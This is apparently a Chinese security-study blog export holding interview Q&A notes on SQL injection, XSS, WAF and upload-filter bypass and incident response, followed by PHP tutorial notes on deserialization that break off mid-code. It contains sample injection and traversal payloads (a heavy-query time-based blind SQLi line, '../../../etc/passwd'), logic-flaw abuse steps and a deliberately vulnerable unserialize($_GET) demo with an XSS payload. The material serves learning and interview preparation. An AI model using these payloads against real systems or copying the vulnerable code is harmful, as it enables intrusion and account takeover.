title="3.31面试题目："></a>3.31面试题目：</h2><p><strong>SQL注入时间盲注的函数：</strong>length（）返回字符串长度、ascii（）返回一个字符串的ascii码、mid（）取出字符串一部分值、substr（）截取字符串、hex（）返回16进制数、sleep（）时间注入核心函数、if（）判断函数</p><p><strong>应急响应：常见的应急响应事件分为：</strong></p><p>Web入侵：网页挂马、主页篡改、webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><p><strong>Linux文件溯源：</strong>远控：拿沙盒分析webshell，看看日志有哪些ip对这个文件进行了访问。Web：分析恶意文件提取IP</p><p><strong>SQL注入字符型和数字型的区别：</strong>字符型注入语句需要使用闭合语句，而数字型注入的语句不需要闭合</p><p><strong>107和11端口的服务：</strong>107远程隐蔽的控制访问服务、11系统状态监控</p><p><strong>SQL注入绕过WAF：</strong>大小写绕过、替换关键字、空格绕过、内联注释、比较符绕过、宽字节绕过</p><p><strong>Xss绕过WAF：</strong>借助黑名单绕过、数字字符编码绕过、大小写绕过、标签双写、空字节绕过、Unicode分隔符</p><p><strong>如何通过流量分析判断攻击类型：</strong>通过流量分析发送的payload，分析payload的构造进行判断。当发现payload中存在SQL语句则该攻击类型为SQL注入。当payload中发现前端代码则该攻击为xss攻击。当payload中发现文件名进行特殊修改或者尝试绕过过滤例如：phP等则该攻击方式为文件上传攻击。</p><p><strong>如何通过流量分析判断是否为使用sqlmap进行的攻击：</strong>1、使用sqlmap进行攻击会产生大量数据2、payload中会存在SQL语句</p><p><strong>常见的端口对应的服务：</strong>11系统状态监控、21FTP文件传输、22SSH、23Telnet远程登录、25SMTP邮件传输、53DNS服务器端口、69TFTP文件传输、80http、107远程登录终端109&amp;110POP3邮件接收、443Https、1433MSSQL数据库、1521ORACLE数据库、3306MySQL数据库、3389远程连接桌面、8080Tomcat，这里是<a href="https://wenku.baidu.com/view/f3cfa0b4da38376bae1fae2d.html" target="_blank" rel="noopener">端口大全</a></p><p><strong>针对文件上传漏洞的过滤你会采取什么措施：</strong>前端：使用burp抓包修改文件后缀或者禁用js。后端：修改http Header content-type为允许字段、00截断绕过上传、文件名大小写绕过、名单列表绕过、特殊文件名绕过、htaccess文件绕过、写入方法绕过</p><h2 id="4-1面试题目："><a href="#4-1面试题目：" class="headerlink" title="4.1面试题目："></a>4.1面试题目：</h2><p><strong>常见的java漏洞：</strong>代码注入、命令注入、连接字符串注入、任意文件下载、任意文件上传、任意目录遍历</p><p><strong>常见的脚本语言：</strong>JavaScript、php、VBScript、python等</p><p><strong>SQL注入分为几类：</strong>布尔盲注、Union注入、报错注入、宽字节注入、时间注入、万能密码、过滤绕过</p><p><strong>常见的web漏洞：</strong>文件上传漏洞、SQL注入漏洞、xss漏洞、文件包含漏洞、弱口令、命令执行漏洞等</p><p><strong>常见的安全设备：</strong>WAF防火墙、IDS入侵检测系统、IPS入侵预防系统、VPN等</p><p><strong>目录遍历的攻击特征：</strong>通过URL传过来的参数，进行URL解码后对其进行分析，其中大部分情况是以../../../etc/passwd作为第一次的要进行目录穿越时构造的payload</p><h2 id="通过以前参加HW的大佬得到的面试题："><a href="#通过以前参加HW的大佬得到的面试题：" class="headerlink" title="通过以前参加HW的大佬得到的面试题："></a><strong>通过以前参加HW的大佬得到的面试题：</strong></h2><p><strong>1、讲述一下搜索框注入的方法：</strong>这里的语法跟普通注入是一样的，搜索框文本注入闭合是有区别的，搜索1’如果报错可能存在漏洞，那么就尝试闭合+注释，1’and 1=1 and ‘1’=’1。如果1=2报错那么这里就确定存在注入了，接下来构造语句即可。</p><p><strong>2、逻辑漏洞的类型：</strong></p><p>支付漏洞：如果系统没有做好价格，数量，支付状态检测，那么就可能存在了支付漏洞，通过修改对应的传参，例如商品的金额，以低价购买高价的物品。</p><p>手机验证码绕过，任意密码重置：此漏洞也是由于系统没有做好检测，只是前端进行了校验，那么通过burp改包就可以绕过。例如在修改密码的地方，放包，抓取响应的状态，修改数值，例如0改为1，false改为true，在放包，就可以达到欺骗客户端的操作。这样的话，找寻大量的手机号，通过抓包改包导致了任意密码重置。</p><p>邮箱验证码可伪造：例如在找会密码的地方，会让用户输入邮箱，然后给你发送一段链接，通过去邮箱查看链接，可以发现中间的一些值是加密的，可通过解密来发现，这个值是你的邮箱，或者一串随机值，那么就可以尝试构造这串值，在另一个用户的地方找回密码。</p><p><strong>3、反射型XSS和DOM型XSS的区别：</strong>dom型xss是通过修改或读取docunment的属性和方法进行攻击，既有反射型也有存储型，而且没有与服务器进行交互。</p><p><strong>4、Linux上传了webshell如何查杀：</strong>首先top查看进程，是否有cpu占用率特别高的以及ID是随机数的，可以尝试kill进程，再次查看还会不会出现。然后可以用ps -ef|gred查看进程详细信息，用/proc找到进程，cp+sz下载文件放入微步在线云沙箱进行分析。确认是木马就删除文件。再cat/etc/rc排查开机启动项和cat/etc/crontab排查定时任务，last,lastlog等排查日志和可以可疑用户。</p><p><strong>5、在一个大流量的环境中，如何快速对报警进行一个判断：</strong>如果是大量相同源ip发起的请求，首先判断是不是一个误报。如果是内部问题导致的误报可以请求甲方进行整改，如果甲方拒绝整改就把这个拉入白名单。同样如果是大量相同的源ip对同一个ip或者网段有大量报警，可以考虑是扫描器或者爆破，比如查看参数，己方是java搭建的网站，却出现了php的语句，可以判断是扫描器在扫描。</p><h1 id="长亭面试题："><a href="#长亭面试题：" class="headerlink" title="长亭面试题："></a>长亭面试题：</h1><p>1<strong>、sleep函数被禁用后，如何进行时间盲注：</strong></p><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。 mysql：AND (SELECT count(<em>) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);<br><em>*2、CSRF怎么防护：</em></em></p><p>尽量使用POST，限制GET、浏览器cookie策略、加验证码等<br><strong>3、如果一台服务器被入侵后，你会如何做应急响应：</strong></p><p>准备相关工具、查后门等工具、初步判断事件类型，时间等级、抑制范围，隔离使受害面不继续扩大、查找原因，封堵攻击源、业务恢复正常水平、总结，报告，并修复，监控<br><strong>4、如何判断SQL注入，有哪些方法：</strong></p><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过sleep,修眠语句执行5秒等，除此之外通过DNSlog判断是还有传回值<br><strong>5、宽字节注入原理：</strong></p><p>在mysql中使用了gbk编码，占用2个字节,而mysql的一种特性,GBK是多字节编码，它认为两个字节就代表一个汉字，所以%df时候会和转义符\ %5c进行结合,所以单引号就逃逸了出来,当第一个字节的ascii码大于128，就可以了。</p><p><strong>6、Webshell检测有哪些方法：</strong></p><p>grep、关键词、关键函数、安全狗、D盾</p><p><strong>7、SSRF漏洞成因防御绕过：</strong></p><p>模拟服务器对其它资源进行请求 IP探测，如果想漏洞利用必需要构造好Payload 禁止跳转，限制协议，内外网限制，URL限制 针对IP格式</p><p><strong>8、XSS攻击原理：</strong></p><p>反射型xss在浏览器上运行一遍就会造成的攻击，运行一次，不会长时间留存、存储型xss多见于评论处，恶意xss代码写进服务器中，每一次运行都会造成危害，长时间留存</p><p><strong>9、SQL注入防护方法：</strong></p><p>使用安全的API、对输入的特殊字符进行Escape转义处理、使用白名单来规范化输入验证方法、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤转义替换删除</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP大学习</title>
      <link href="/2021/02/10/php-da-xue-xi/"/>
      <url>/2021/02/10/php-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=386844&auto=1&height=66"></iframe><h1 id="PHP函数："><a href="#PHP函数：" class="headerlink" title="PHP函数："></a>PHP函数：</h1><h2 id="1-foreach用法："><a href="#1-foreach用法：" class="headerlink" title="1.foreach用法："></a>1.foreach用法：</h2><pre><code>$x = array(1,2,3,4,5)foreach ($x as $y) {     //这里的y依次为1,2,3,4,5     }</code></pre><h2 id="2-isset理解："><a href="#2-isset理解：" class="headerlink" title="2.isset理解："></a>2.isset理解：</h2><pre><code>$q = isset($_POST[&#39;q&#39;])? $_POST[&#39;q&#39;] : &#39;&#39;;</code></pre><p>是否Form提交的内容中有名为q的值， 如果有则取q的值，否则$q赋值为空字符串。</p><h2 id="3-error-reporting-0"><a href="#3-error-reporting-0" class="headerlink" title="3.error_reporting(0);"></a>3.error_reporting(0);</h2><p>error_reporting(0);//关闭所有<em>php</em>错误报告</p><h2 id="4-include"><a href="#4-include" class="headerlink" title="4.include"></a>4.include</h2><p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li><p>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</p></li><li><p>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</p></li><li><p><strong>假设我们有一个定义变量的包含文件（”vars.php”）：</strong></p></li><li><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$color</span><span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">;</span><span class="token variable">$car</span><span class="token operator">=</span><span class="token string">'BMW'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这些变量可用在调用文件中：</strong></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>菜鸟教程(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>欢迎来到我的主页!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?php include 'vars.php';echo "I have a $color $car"; // I have a red BMW?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="5-rand-函数"><a href="#5-rand-函数" class="headerlink" title="5.rand()函数"></a>5.rand()函数</h2><p>rand(1,10):从1-10之中随机取一个数字</p><h2 id="6-strpos-函数"><a href="#6-strpos-函数" class="headerlink" title="6.strpos() 函数"></a>6.strpos() 函数</h2><p><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-string-strpos.html</a></p><p>相关函数：</p><ul><li><a href="https://www.runoob.com/php/func-string-strripos.html" target="_blank" rel="noopener">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.runoob.com/php/func-string-strrpos.html" target="_blank" rel="noopener">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><h2 id="7-file-get-contents-函数"><a href="#7-file-get-contents-函数" class="headerlink" title="7.file_get_contents() 函数"></a>7.<a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html" target="_blank" rel="noopener">file_get_contents() 函数</a></h2><pre><code>&lt;?phpecho file_get_contents(&quot;test.txt&quot;);?&gt;</code></pre><p>上面的代码将输出：</p><p>This is a test file with test text.</p><p>也就是说可以利用这个函数来读一个文件中的文本</p><h1 id="PHP之序列化"><a href="#PHP之序列化" class="headerlink" title="PHP之序列化"></a>PHP之序列化</h1><h2 id="序列化的开始php中serialize-与unserialize-函数使用方法"><a href="#序列化的开始php中serialize-与unserialize-函数使用方法" class="headerlink" title="序列化的开始php中serialize()与unserialize()函数使用方法"></a>序列化的开始<a href="https://so.csdn.net/search?q=php%E4%B8%ADunserialize" target="_blank" rel="noopener">php中serialize()与unserialize()函数使用方法</a></h2><p>序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p><p>理解：</p><p>意思可能就是将代码变成一种可以进行传输的一组数据流，就是一串简化后的字符串</p><p>实操：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个person类，在类中定义了三个属性，然后实例化了一个a，使用serializa将$a这个对象进行了序列化：</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"yyk"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</strong></p><p><strong>6 代表类名字person占6个字符</strong></p><p><strong>person 类名</strong></p><p><strong>3 代表三个属性</strong></p><p><strong>s 代表字符串</strong></p><p><strong>4 代表属性名长度</strong></p><p><strong>name 属性名</strong></p><p><strong>s:3:”yyk” 字符串 属性值长度 属性值</strong></p><p>同时随着访问控制修饰符的改变，序列化后的属性长度和属性值也会不同：</p><ul><li>public(公有)</li><li>protected(受保护)</li><li>private(私有的)</li></ul><p>举例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到如下：</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"yyk"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"%00person%00sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"%00*%00age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>protected属性被序列化后属性名长度会增加3，因为属性名会变成%00*%00属性名。</p><p>private属性被序列化后属性名会变成%00类名%00属性名。</p><h3 id="魔术方法-sleep"><a href="#魔术方法-sleep" class="headerlink" title="魔术方法 sleep()"></a>魔术方法 <strong>sleep()</strong></h3><p>serialize()函数在序列化对象的时候会检查类中是否存在魔术方法sleep()。如果存在，sleep()方法会先被调用，然后再执行序列化操作。<code>__sleep()方法可以确定那些属性被序列化。如果没有__</code>sleep()方法则默认序列化所有属性。</p><p>实操</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我在类中构造__sleep()函数，以实现$age，$sex被序列化，而$name没有被序列化</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"personsex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"*age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前引：</p><p><strong>unserialize()后会导致 <code>__wakeup()</code>或 <code>__destruct()</code>的直接调用，中间无需其他过程.</strong></p><p><strong>因此最理想的情况就是一些漏洞/危害代码在 <code>__wakeup()</code> 或 <code>__destruct()</code>中，从而当我们控制序列化字符串时可以去直接触发它们 .</strong></p><h3 id="魔术方法-destruct"><a href="#魔术方法-destruct" class="headerlink" title="魔术方法 __destruct()"></a>魔术方法 __destruct()</h3><p>脚本运行结束之前会调用对象的析构函数</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造url：</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"yyk"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会得到yyk</p><p> 漏洞利用：我们可以构建payload，将恶意代码插入序列化的字符串，然后将恶意代码转换成对象，调用__destruct()方法执行恶意代码。</p><p>payload:</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="魔术方法-wakeup"><a href="#魔术方法-wakeup" class="headerlink" title="魔术方法 __wakeup()"></a>魔术方法 __wakeup()</h3><p>unserialize()函数在序列化对象的时候会检查类中是否存在魔术方法wakeup()。如果存在，wakeup()方法会先被调用，然后再执行反序列化操作。可以再__wakeup()方法中对属性进行初始化或者改变。</p><p>比如：在进行反序列化的时候对属性进行重新赋值。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'renew name'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说，在unserialize()函数发动之前，wakeup函数会提前觉醒，并且发动</p><p>源码分析：实例化一个对象，然后将它序列化后输出。再进行反序列化，调用了wakeup()函数，导致序列化后$name变成了renew name。</p><p>这些看起来似乎是没有什么危害，但是如果wakeup()函数处定义的代码不是重新赋值，而是漏洞代码危害就大了。</p><p>例如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'zhangsan'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'18'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 